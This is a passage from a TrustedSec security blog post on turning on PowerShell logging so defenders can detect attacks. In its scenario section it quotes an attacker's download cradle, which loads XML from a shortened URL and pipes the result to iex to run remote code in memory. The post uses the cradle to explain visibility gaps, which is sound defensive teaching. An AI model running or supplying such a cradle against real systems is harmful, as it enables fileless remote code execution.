---
title: Building a Detection Foundation: Part 3 - PowerShell and Script Logging
url: https://trustedsec.com/blog/building-a-detection-foundation-part-3-powershell-and-script-logging
source: TrustedSec
date: 2026-03-10
fetch_date: 2026-03-11T04:04:59.823443
---

# Building a Detection Foundation: Part 3 - PowerShell and Script Logging

[Skip to Main Content](#main)

All Trimarc services are now delivered through TrustedSec!
[Learn more](https://trustedsec.com/about-us/news/trimarc-joins-forces-with-trustedsec-to-strengthen-security-advisory-services)

Close

[TrustedSec](https://trustedsec.com/)

* [Solutions](https://trustedsec.com/solutions)

  ## Solutions

  Our custom solutions are tailored to address the unique challenges of different roles in security.

  [Solutions](https://trustedsec.com/solutions)

  + [01

    For Leadership

    We understand the challenges facing modern executives and develop solutions unique to leaders.](https://trustedsec.com/solutions/for-leadership)
  + [02

    For Operations

    We stay one step ahead to proactively safeguard our clients and partners.](https://trustedsec.com/solutions/for-operations)
  + [03

    For Infrastructure

    From architecture to resiliency and maintainability, we keep your tech aligned to best practices.](https://trustedsec.com/solutions/for-infrastructure)
  + [04

    For Assurance

    Our compliance experts guide partners through regulatory requirements to ensure standards are met.](https://trustedsec.com/solutions/for-assurance)
* [Services](https://trustedsec.com/services)

  ## Services

  From building to testing to hardening, our services support security at every stage.

  [Services](https://trustedsec.com/services)

  + [01

    Design

    Design an exceptional, custom security program alongside our security experts.](https://trustedsec.com/services/design)
  + [02

    Evaluate

    Evaluate your security program with proven assessment methodologies.](https://trustedsec.com/services/evaluate)
  + [03

    Harden

    Harden your security program with the help of our security experts.](https://trustedsec.com/services/harden)
  + [04

    Respond

    Respond to threats to your security program with the help of our security experts.](https://trustedsec.com/services/respond)
* [Research](https://trustedsec.com/research)
* [Blog](https://trustedsec.com/blog)
* [Resources](https://trustedsec.com/resources)
* [About Us](https://trustedsec.com/about-us)

  ## About Us

  Driven by purpose, fueled by experts.

  [About Us](https://trustedsec.com/about-us)

  + [01

    Our Team

    Meet our security experts.](https://trustedsec.com/about-us/our-team)
  + [02

    Our Partners

    Become a TrustedSec partner to help your customers anticipate and prepare for potential attacks.](https://trustedsec.com/about-us/our-partners)
  + [03

    News

    Our team is trusted by local and national media to be the subject matter experts for security news.](https://trustedsec.com/about-us/news)
  + [04

    Events

    See our upcoming webinars, conferences, talks, trainings, and more!](https://trustedsec.com/about-us/events)

Search

Menu

Search Input

Search

* [Contact Us](https://trustedsec.com/contact)
* [Report a breach](https://trustedsec.com/report-a-breach)

* [Solutions](https://trustedsec.com/solutions)
* [Services](https://trustedsec.com/services)
* [Research](https://trustedsec.com/research)
* [Blog](https://trustedsec.com/blog)
* [Resources](https://trustedsec.com/resources)
* [About Us](https://trustedsec.com/about-us)

Search

* [Contact Us](https://trustedsec.com/contact)
* [Report a breach](https://trustedsec.com/report-a-breach)

* [Blog](https://trustedsec.com/blog)
* [Building a Detection Foundation: Part 3 - PowerShell and Script Logging](https://trustedsec.com/blog/building-a-detection-foundation-part-3-powershell-and-script-logging)

March 10, 2026

# Building a Detection Foundation: Part 3 - PowerShell and Script Logging

Written by
Carlos Perez

Threat Hunting
Incident Response

![](https://trusted-sec.transforms.svdcdn.com/production/images/Blog-Covers/BuildingDetectionFoundation-Pt3_WebHero.jpg?w=320&h=320&q=90&auto=format&fit=crop&dm=1772817713&s=b7f2999aa84477c48ea47ccbf489e964)

Table of contents

* [Why Native PowerShell Logging Matters](#LoggingMatters)
* [The Three Pillars of PowerShell Logging](#ThreePillars)
* [Real-World Example: Seeing Through Obfuscation](#RealWord)
* [Handling Log Volume](#LogVolume)
* [Correlating PowerShell Events With Security Events](#CorrelatingEvents)
* [Detection Opportunities](#DetectionOp)
* [A Note on AMSI](#ASMI)
* [What's Still Missing](#Missing)

Share

* Share URL
* [Share via Email](/cdn-cgi/l/email-protection#c2fdb1b7a0a8a7a1b6ff81aaa7a1a9e7f0f2adb7b6e7f0f2b6aaabb1e7f0f2a3b0b6aba1aea7e7f0f2a4b0adafe7f0f296b0b7b1b6a7a691a7a1e7f0f3e4a3afb2f9a0ada6bbff80b7abaea6abaca5e7f0f2a3e7f0f286a7b6a7a1b6abadace7f0f284adb7aca6a3b6abadace7f183e7f0f292a3b0b6e7f0f2f1e7f0f2efe7f0f292adb5a7b091aaa7aeaee7f0f2a3aca6e7f0f291a1b0abb2b6e7f0f28eada5a5abaca5e7f183e7f0f2aab6b6b2b1e7f183e7f084e7f084b6b0b7b1b6a7a6b1a7a1eca1adafe7f084a0aeada5e7f084a0b7abaea6abaca5efa3efa6a7b6a7a1b6abadacefa4adb7aca6a3b6abadacefb2a3b0b6eff1efb2adb5a7b0b1aaa7aeaeefa3aca6efb1a1b0abb2b6efaeada5a5abaca5 "Share via Email")
* [Share on Facebook](http://www.facebook.com/sharer.php?u=https%3A%2F%2Ftrustedsec.com%2Fblog%2Fbuilding-a-detection-foundation-part-3-powershell-and-script-logging "Share on Facebook")
* [Share on X](http://twitter.com/share?text=Building%20a%20Detection%20Foundation%3A%20Part%203%20-%20PowerShell%20and%20Script%20Logging%3A%20https%3A%2F%2Ftrustedsec.com%2Fblog%2Fbuilding-a-detection-foundation-part-3-powershell-and-script-logging "Share on X")
* [Share on LinkedIn](https://www.linkedin.com/shareArticle?url=https%3A%2F%2Ftrustedsec.com%2Fblog%2Fbuilding-a-detection-foundation-part-3-powershell-and-script-logging&mini=true "Share on LinkedIn")

## The Second Most Important Data Source You're Probably Not Capturing

In [Part 2](https://trustedsec.com/blog/building-a-detection-foundation-part-2-windows-security-events), we enabled process creation logging with command lines. That's a big step forward. But here's the thing about PowerShell: knowing that ***powershell.exe*** ran with an encoded command is helpful, but it doesn't tell you what that encoded command actually *did* after it decoded and executed.

Command Execution is the second-highest coverage [data source in MITRE ATT&CK](https://attack.mitre.org/) at 209 techniques. PowerShell logging directly addresses this, and it captures activity that process creation events simply cannot.

We see PowerShell abuse very often used with great success by actors of all levels, yet we still see a Pentester and Red Teamer on X and other platforms saying PowerShell is dead…

![](https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/DetectionFoundation_Carlos/Fig01_Carlos_Detectionpt3.jpg?w=320&q=90&auto=format&fit=max&dm=1772817750&s=9adfc9094b33be9e7db508d9fa8b8229)

## Why Native PowerShell Logging Matters

Consider this common scenario: an attacker runs PowerShell with a Base64-encoded command or downloads a script from the Internet and executes it in memory without ever touching disk. Here's what your Event ID 4688 shows:

```
$xml = New-Object System.Xml.XmlDocument
$xml.Load("https://bit.ly/2rHx0So")
$xml.command.a.command | iex
```

You can see the download cradle. That's useful. But what did the payload contain? When we checked the URL the attacker had removed it. What commands did it run after downloading? Without PowerShell logging, you don't know. The payload executed entirely in memory—no new processes, no files on disk, no additional 4688 events.

**This is exactly what PowerShell logging captures.**

## The Three Pillars of PowerShell Logging

PowerShell offers three complementary logging mechanisms. I recommend enabling all of them.

**1. Module Logging (Event ID 4103)**

Module logging captures pipeline execution details. Every time a PowerShell command executes, module logging records what module was used and the command parameters.

**What it captures:**

* Command invocations
* Pipeline output (can be verbose)
* Module and command names
* Parameters passed to commands

**Limitations:**

* Can generate si...